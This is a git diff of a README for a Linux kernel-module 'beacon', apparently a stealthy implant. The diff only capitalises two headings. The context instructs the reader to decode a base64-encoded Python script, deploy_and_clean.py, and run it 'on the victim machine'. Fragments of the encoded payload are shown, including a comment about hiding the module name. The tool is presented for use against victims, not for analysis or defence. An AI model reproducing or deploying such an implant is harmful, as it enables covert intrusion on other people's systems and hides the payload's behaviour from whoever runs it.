@@ -8,7 +8,7 @@ My idea was to create a kernel module for linux machine which is basically a bea
 
 To use this software you should install a desktop app and run deploy_and_clean.py (I recommend to assemble file with base64)on the victim machine
 
-### victim machine :syringe:
+### Victim machine :syringe:
 
 ```bash
 base64 -d aW1wb3J0IG9zCmltcG9ydCBhcmdwYXJzZQoKI21vZHVsZV9uYW1lIGlzIG5lZWRlZCB0byBoaWRl
@@ -57,7 +57,7 @@ X19tYWluX18iOgogICAgbWFpbigpCg== > deploy_and_clean.py`
 ```python
 python3 deploy_and_clean.py`
 ```
-### your machine :computer:
+### Your machine :computer:
 ```bash
 apt-get install kernel-delirium (Not gonna work yet)
 ```
